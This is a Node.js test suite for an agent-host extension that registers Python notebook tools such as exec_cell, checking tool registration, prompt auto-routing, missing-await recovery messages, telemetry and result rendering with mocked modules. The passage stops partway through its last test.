const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

// These are host-extension tests, not nested-agent behavior tests. A depth of
// zero also suppresses unrelated background subagent-environment provisioning.
process.env.PI_SUBAGENT_DEPTH = "0";

function setModuleExports(modulePath, exports) {
  const resolved = require.resolve(modulePath);
  const previous = require.cache[resolved];
  require.cache[resolved] = {
    id: resolved,
    filename: resolved,
    loaded: true,
    exports,
  };
  return () => {
    if (previous) {
      require.cache[resolved] = previous;
    } else {
      delete require.cache[resolved];
    }
  };
}

function makeFakeSessionManager(sandbox) {
  return class FakePythonSessionManager {
    static lastInstance = null;

    constructor(sandboxManager, toolRegistry, settings, extensionRoot, hooks) {
      this.sandboxManager = sandboxManager;
      this.toolRegistry = toolRegistry;
      this.settings = settings;
      this.extensionRoot = extensionRoot;
      this.hooks = hooks ?? {};
      FakePythonSessionManager.lastInstance = this;
      if (sandbox.instances !== undefined) {
        sandbox.instances += 1;
      }
    }

    async provision() {
      return { id: "s1" };
    }

    async execForeground(sessionId, code) {
      return this.execute(sessionId, code);
    }

    async readCellOutput(cellIdx, options) {
      return {
        text: `cell ${cellIdx} offset ${options.offset ?? 1} limit ${options.limit ?? "default"}`,
        notebookPath: "/tmp/test.ipynb",
        cellIdx,
      };
    }

    async promoteToSkillNotebook(options) {
      return {
        name: options.name,
        path: `/tmp/library/${options.name}.ipynb`,
        notebookPath: options.notebookPath ?? "/tmp/test.ipynb",
        overwritten: false,
      };
    }

    list() {
      return [];
    }

    mostRecentActive() {
      return null;
    }

    allSubagentSnapshots() {
      return [];
    }

    getSubagentSnapshot() {
      return null;
    }

    async markBackgrounded() {
      return null;
    }

    async dispose() {}

    async disposeAll() {}

    async execute(_sessionId, _code) {
      return {
        output: "ok",
        details: {
          nestedToolCalls: 0,
          nestedToolNames: [],
          nestedResultChars: 0,
          nestedResultCount: 0,
          nestedErrors: 0,
          durationMs: 1,
          estimatedAvoidedTokens: 0,
        },
      };
    }
  };
}

function buildPi({ eventHandlers, registered, activeTools }) {
  const commands = {};
  const pi = {
    registerTool(tool) {
      registered.push(tool);
    },
    registerCommand(name, definition) {
      commands[name] = definition;
    },
    commands,
    on(event, handler) {
      eventHandlers.set(event, handler);
    },
    getAllTools() {
      return [{ name: "exec_cell" }];
    },
    getActiveTools() {
      return [...activeTools];
    },
    setActiveTools(next) {
      activeTools.splice(0, activeTools.length, ...next);
    },
  };
  return { pi, commands };
}

function restoreInjectedModules(sandbox, overrides = {}) {
  const restoreSandbox = setModuleExports("../dist/sandbox-manager.js", {
    createSandbox: async () => sandbox,
  });
  const restoreManager = setModuleExports("../dist/custom-tool-manager.js", {
    CustomToolManager: class FakeCustomToolManager {
      async start() {}
      close() {}
    },
  });
  const restoreRegistry = setModuleExports("../dist/tool-registry.js", {
    ToolRegistry: class FakeToolRegistry {
      getCallableTools() {
        return [{ name: "read", source: "builtin", isReadOnly: true }];
      }

      getAutoRoutableToolNames() {
        return ["read", "grep"];
      }
    },
  });
  const FakeSessionManager = makeFakeSessionManager(sandbox);
  for (const [method, implementation] of Object.entries(overrides)) {
    FakeSessionManager.prototype[method] = implementation;
  }
  const restoreSessions = setModuleExports("../dist/python-session-manager.js", {
    PythonSessionManager: FakeSessionManager,
  });
  return () => {
    restoreSandbox();
    restoreManager();
    restoreRegistry();
    restoreSessions();
  };
}

async function loadExtension() {
  delete require.cache[require.resolve("../dist/index.js")];
  const extensionModule = require("../dist/index.js");
  const ptcExtension = extensionModule.default || extensionModule;
  return ptcExtension;
}

function toolResultDetails(result) {
  return result.details;
}

test("ptc extension bootstraps session tools, the /ptc command, and cleans up runtime components", async () => {
  const sandbox = {
    cleanupCalls: 0,
    spawn() {
      throw new Error("sandbox spawn should not be used in bootstrap test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
    async cleanup() {
      this.cleanupCalls += 1;
    },
  };

  let managerInstance = null;

  class FakeCustomToolManager {
    constructor(extensionRoot, pi, toolRegistry, onToolSetChanged) {
      this.extensionRoot = extensionRoot;
      this.pi = pi;
      this.toolRegistry = toolRegistry;
      this.onToolSetChanged = onToolSetChanged;
      this.started = 0;
      this.closed = 0;
      managerInstance = this;
    }

    async start() {
      this.started += 1;
      this.onToolSetChanged();
    }

    close() {
      this.closed += 1;
    }
  }

  const restoreManager = setModuleExports("../dist/custom-tool-manager.js", {
    CustomToolManager: FakeCustomToolManager,
  });
  const FakeToolRegistry = class {
    getCallableTools() {
      return [];
    }

    getAutoRoutableToolNames() {
      return ["read", "grep"];
    }
  };
  const restoreRegistry = setModuleExports("../dist/tool-registry.js", {
    ToolRegistry: FakeToolRegistry,
  });
  const FakeSessionManager = makeFakeSessionManager(sandbox);
  const restoreSessions = setModuleExports("../dist/python-session-manager.js", {
    PythonSessionManager: FakeSessionManager,
  });
  const restoreSandbox = setModuleExports("../dist/sandbox-manager.js", {
    createSandbox: async () => sandbox,
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi, commands } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const toolNames = registered.map((tool) => tool.name).sort();
    assert.deepEqual(
      toolNames.sort(),
      [
        "delete_cell",
        "exec_cell",
        "inspect_kernel",
        "list_kernels",
        "promote_to_skill_notebook",
        "provision_dependency",
        "provision_kernel",
        "read_cell",
        "read_cell_output",
        "read_cells",
        "request_cell_review",
        "reset_kernel",
        "run_all",
        "run_cell",
        "run_to",
        "scratch_run",
        "write_cell",
      ].sort(),
    );
    const readCellOutput = registered.find((tool) => tool.name === "read_cell_output");
    assert.deepEqual(Object.keys(readCellOutput.parameters.properties), ["cellIdx", "kernel", "offset", "limit"]);
    const readResult = await readCellOutput.execute(
      "read-output",
      { cellIdx: 3, offset: 2, limit: 4 },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );
    assert.equal(readResult.content[0].text, "cell 3 offset 2 limit 4");

    const provisionKernel = registered.find((tool) => tool.name === "provision_kernel");
    assert.deepEqual(Object.keys(provisionKernel.parameters.properties), ["notebook", "source", "version"]);
    const promote = registered.find((tool) => tool.name === "promote_to_skill_notebook");
    assert.deepEqual(Object.keys(promote.parameters.properties), ["name", "notebookPath", "overwrite"]);
    const promoted = await promote.execute(
      "promote",
      { name: "review-workflow", notebookPath: "/tmp/review.ipynb" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );
    assert.equal(promoted.details.path, "/tmp/library/review-workflow.ipynb");

    assert.ok(commands.ptc);
    assert.equal(managerInstance.started, 1);

    await eventHandlers.get("session_shutdown")();
    assert.equal(managerInstance.closed, 1);
    assert.equal(sandbox.cleanupCalls, 1);
  } finally {
    restoreSandbox();
    restoreManager();
    restoreRegistry();
    restoreSessions();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension auto-routes repo-wide analysis prompts toward exec_cell", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in bootstrap test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox);

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const activeTools = ["read", "grep"];
    const { pi } = buildPi({ eventHandlers, registered, activeTools });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const execCell = registered.find((tool) => tool.name === "exec_cell");
    const inspectKernel = registered.find((tool) => tool.name === "inspect_kernel");
    assert.match(execCell.description, /Host tools callable from Python in this kernel: read/);
    assert.match(inspectKernel.description, /Available Python helpers:/);

    const routeResult = eventHandlers.get("before_agent_start")({
      prompt: "Analyze the first 8 test/**/*.test.ts files and return compact JSON only",
      systemPrompt: "base prompt",
    });

    assert.deepEqual(activeTools, ["exec_cell", "provision_kernel", "read_cell_output"]);
    assert.match(routeResult.systemPrompt, /strong fit for exec_cell/);
    assert.match(routeResult.systemPrompt, /provision_kernel/);

    eventHandlers.get("agent_end")();
    assert.deepEqual(activeTools, ["read", "grep"]);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

function restoreInjectedModulesNoOverrides(sandbox) {
  return restoreInjectedModules(sandbox);
}

test("ptc extension does not auto-route or auto-recover mutation prompts", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in mutation prompt test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      throw new PtcPythonError(
        "TypeError: object of type 'coroutine' has no len()",
        'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
      );
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const activeTools = ["read", "grep"];
    const { pi } = buildPi({ eventHandlers, registered, activeTools });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const routeResult = eventHandlers.get("before_agent_start")({
      prompt: "Fix the failing tests across src/**/*.ts and return compact JSON only",
      systemPrompt: "base prompt",
    });

    assert.equal(routeResult, undefined);
    assert.deepEqual(activeTools, ["read", "grep"]);

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { session_id: "s1", code: "path = 'README.md'\ncontent = read(path)\nreturn len(content)" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const contextResult = eventHandlers.get("context")({ messages: [] });
    assert.equal(contextResult, undefined);
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension resets recovery state for each user request", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in recovery state test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox, {
    async execForeground() {
      return successResult();
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    const firstResult = await pythonExecTool.execute("call-1", { session_id: "s1", code: "return 1" }, undefined, undefined, { cwd: process.cwd() });
    const secondResult = await pythonExecTool.execute("call-2", { session_id: "s1", code: "return 2" }, undefined, undefined, { cwd: process.cwd() });

    const firstTelemetry = firstResult.details.telemetry;
    assert.deepEqual(firstTelemetry, {
      autoRouted: false,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 1,
      recoveryAttemptCount: 0,
      terminalState: "success",
    });
    assert.deepEqual(secondResult.details.telemetry, {
      autoRouted: false,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 2,
      recoveryAttemptCount: 0,
      terminalState: "success",
    });

    eventHandlers.get("agent_end")();
    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    const thirdResult = await pythonExecTool.execute("call-3", { session_id: "s1", code: "return 3" }, undefined, undefined, { cwd: process.cwd() });

    assert.deepEqual(thirdResult.details.telemetry, {
      autoRouted: false,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 1,
      recoveryAttemptCount: 0,
      terminalState: "success",
    });
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension appends one targeted recovery message on the next turn after a qualifying async failure", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");
  const recoveryPrompt =
    "PTC recovery: You called an async helper without await. Helpers like read, glob, find, grep, and ls are async wrappers. Await each helper call before using its result.";

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in recovery lifecycle test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      throw new PtcPythonError(
        "TypeError: object of type 'coroutine' has no len()",
        'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
      );
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { session_id: "s1", code: "path = 'README.md'\ncontent = read(path)\nreturn len(content)" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const firstContext = eventHandlers.get("context")({
      messages: [{ role: "user", content: [{ type: "text", text: "Analyze files" }] }],
    });
    assert.equal(firstContext.messages.length, 2);
    assert.deepEqual(firstContext.messages[1], {
      role: "custom",
      customType: "ptc-recovery",
      content: recoveryPrompt,
      display: true,
      timestamp: firstContext.messages[1].timestamp,
    });
    assert.equal(typeof firstContext.messages[1].timestamp, "number");

    const secondContext = eventHandlers.get("context")({
      messages: [{ role: "user", content: [{ type: "text", text: "Analyze files" }] }],
    });
    assert.equal(secondContext, undefined);
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension does not append a second automatic recovery message after recovery was already used", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in recovery lifecycle test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  let attempts = 0;
  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      attempts += 1;
      throw new PtcPythonError(
        "TypeError: 'coroutine' object is not iterable",
        'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
      );
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { session_id: "s1", code: "paths = sorted(glob('src/**/*.ts'))\nreturn paths[:3]" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const firstContext = eventHandlers.get("context")({ messages: [] });
    assert.equal(firstContext.messages.length, 1);
    assert.equal(firstContext.messages[0].customType, "ptc-recovery");

    await assert.rejects(
      pythonExecTool.execute(
        "call-2",
        { session_id: "s1", code: "paths = sorted(glob('src/**/*.ts'))\nreturn paths[:3]" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    assert.equal(attempts, 2);
    const secondContext = eventHandlers.get("context")({ messages: [] });
    assert.equal(secondContext, undefined);
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension includes recovery telemetry in successful exec_cell details after one bounded retry", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in recovery telemetry test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  let attempts = 0;
  const restore = restoreInjectedModules(sandbox, {
    async execForeground() {
      attempts += 1;
      if (attempts === 1) {
        throw new PtcPythonError(
          "TypeError: object of type 'coroutine' has no len()",
          'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
        );
      }
      return successResult();
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { session_id: "s1", code: "path = 'README.md'\ncontent = read(path)\nreturn len(content)" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const firstContext = eventHandlers.get("context")({ messages: [] });
    assert.equal(firstContext.messages[0].customType, "ptc-recovery");

    const result = await pythonExecTool.execute(
      "call-2",
      { session_id: "s1", code: "path = 'README.md'\ncontent = await read(path)\nreturn len(content)" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );

    assert.deepEqual(result.details.recovery, {
      eligible: true,
      attempted: true,
      failureClass: "missing-await",
    });
    assert.deepEqual(result.details.telemetry, {
      autoRouted: false,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 2,
      recoveryAttemptCount: 1,
      terminalState: "success",
    });
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension includes first-path telemetry in non-recovered exec_cell details", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in telemetry test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox);

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const activeTools = ["read", "grep"];
    const { pi } = buildPi({ eventHandlers, registered, activeTools });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    eventHandlers.get("before_agent_start")({
      prompt: "Analyze the first 8 test/**/*.test.ts files and return compact JSON only",
      systemPrompt: "base prompt",
    });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    const result = await pythonExecTool.execute(
      "call-1",
      { session_id: "s1", code: "return 1" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );

    assert.deepEqual(result.details.recovery, {
      eligible: false,
      attempted: false,
      failureClass: null,
    });
    assert.deepEqual(result.details.telemetry, {
      autoRouted: true,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 1,
      recoveryAttemptCount: 0,
      terminalState: "success",
    });
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension does not auto-recover literal zero-match path failures", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in zero-match recovery test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      throw new PtcPythonError(
        "FileNotFoundError: [Errno 2] No such file or directory: 'src/**/*.missing.ts'",
        'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
      );
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { session_id: "s1", code: "paths = await glob('src/**/*.missing.ts')\nreturn paths[0]" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const contextResult = eventHandlers.get("context")({ messages: [] });
    assert.equal(contextResult, undefined);
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("exec_cell file mode records and validates the real file contents", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  let captured;
  const restore = restoreInjectedModules(sandbox, {
    async execForeground(sessionId, code, options) {
      captured = { sessionId, code, options };
      return successResult();
    },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const execCell = registered.find((tool) => tool.name === "exec_cell");
    await execCell.execute(
      "file-call",
      { session_id: "s1", file: "test/index.test.ts" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );

    assert.match(captured.code, /const test = require\("node:test"\)/);
    assert.equal(captured.options.file, require("node:path").resolve("test/index.test.ts"));
    assert.notEqual(captured.code, "(exec_cell file mode)\n");
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("completed exec_cell rendering omits missing durations instead of printing NaN", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const restore = restoreInjectedModules(sandbox);

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const execCell = registered.find((tool) => tool.name === "exec_cell");
    const theme = { fg(_color, text) { return text; } };
    const rendered = execCell.renderResult(
      {
        content: [{ type: "text", text: "validation failed" }],
        details: {
          nestedToolCalls: 0,
          nestedToolNames: [],
          nestedResultChars: 0,
          nestedResultCount: 0,
          nestedErrors: 1,
          estimatedAvoidedTokens: 0,
        },
      },
      { isPartial: false },
      theme
    ).render(100).join("\n");
    assert.doesNotMatch(rendered, /NaN/);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("exec_cell partial rendering streams the live Out box below the code view", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      return new Promise(() => {}); // never settles; we only render partials
    },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const execCell = registered.find((tool) => tool.name === "exec_cell");
    const theme = { fg(_color, text) { return text; } };

    const partialDetails = {
      userCode: ["import tqdm", "for _ in tqdm(range(3)):\n    pass"],
      currentLine: 2,
      totalLines: 2,
      liveOutput: ["100%|##########| 3/3"],
      liveOutputHidden: 0,
    };
    const rendered = execCell.renderResult(
      { content: [{ type: "text", text: "Executing line 2/2" }], details: partialDetails },
      { isPartial: true, expanded: false },
      theme,
      { state: {} }
    ).render(80).join("\n");

    // The live Out box renders BELOW the executing-code view, with the
    // emulated screen content (not raw control sequences) inside the fence.
    assert.match(rendered, /Out\[ \]:/);
    assert.match(rendered, /100\|?%/);
    assert.match(rendered, /100%\|##########\| 3\/3/);
    assert.doesNotMatch(rendered, /\x1b\[K/);

    // Truncation marker when the tail cap hid earlier lines.
    const truncated = execCell.renderResult(
      { content: [{ type: "text", text: "Executing" }], details: { ...partialDetails, liveOutputHidden: 7 } },
      { isPartial: true, expanded: false },
      theme,
      { state: {} }
    ).render(80).join("\n");
    assert.match(truncated, /\.\.\. 7 earlier output lines/);

    // No live output yet: no Out box at all.
    const quiet = execCell.renderResult(
      { content: [{ type: "text", text: "Executing line 1/1" }], details: { userCode: ["pass"], currentLine: 1, totalLines: 1 } },
      { isPartial: true, expanded: false },
      theme,
      { state: {} }
    ).render(80).join("\n");
    assert.doesNotMatch(quiet, /Out\[ \]:/);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("parallel exec_cell calls retain independent default command targets", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const pending = new Map();
  const interrupted = [];
  const restore = restoreInjectedModules(sandbox, {
    execForeground(sessionId) {
      return new Promise((resolve) => pending.set(sessionId, resolve));
    },
    list() {
      return [
        { id: "s1", chunks: 0, running: false },
        { id: "s2", chunks: 0, running: false },
      ];
    },
    mostRecentActive() { return null; },
    interruptRunning(sessionId) {
      interrupted.push(sessionId);
      return true;
    },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi, commands } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const execCell = registered.find((tool) => tool.name === "exec_cell");
    const ctx = { cwd: process.cwd() };

    const first = execCell.execute("call-1", { session_id: "s1", code: "1" }, undefined, undefined, ctx);
    const second = execCell.execute("call-2", { session_id: "s2", code: "2" }, undefined, undefined, ctx);
    await commands.ptc.handler("interrupt", { ui: { notify() {} } });
    assert.equal(interrupted.at(-1), "s2");

    pending.get("s1")(successResult());
    await first;
    await commands.ptc.handler("interrupt", { ui: { notify() {} } });
    assert.equal(interrupted.at(-1), "s2");

    pending.get("s2")(successResult());
    await second;
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("failed exec_cell tool results receive terminal telemetry", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const restore = restoreInjectedModules(sandbox, {
    execForeground() { throw new Error("kernel failed"); },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base" });

    const execCell = registered.find((tool) => tool.name === "exec_cell");
    await assert.rejects(
      execCell.execute("failed-call", { session_id: "s1", code: "1" }, undefined, undefined, { cwd: process.cwd() }),
      /kernel failed/
    );
    const transformed = eventHandlers.get("tool_result")({
      toolName: "exec_cell",
      isError: true,
      details: undefined,
    });
    assert.equal(transformed.details.telemetry.terminalState, "failed_without_recovery");
    assert.equal(transformed.details.telemetry.routedToCodeExecution, true);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("provision_dependency does not treat spawn failures as successful installs", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
    resolvePythonExecutable() { return "python3"; },
  };
  const restore = restoreInjectedModules(sandbox);
  const previousPath = process.env.PATH;

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const provisionDependency = registered.find((tool) => tool.name === "provision_dependency");

    process.env.PATH = "/definitely/missing";
    const result = await provisionDependency.execute(
      "dependency-call",
      { package: "example-package" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );
    const text = result.content[0].text;
    assert.match(text, /executable not found \(ENOENT\)/);
    assert.doesNotMatch(text, /already satisfied/);
  } finally {
    process.env.PATH = previousPath;
    restore();
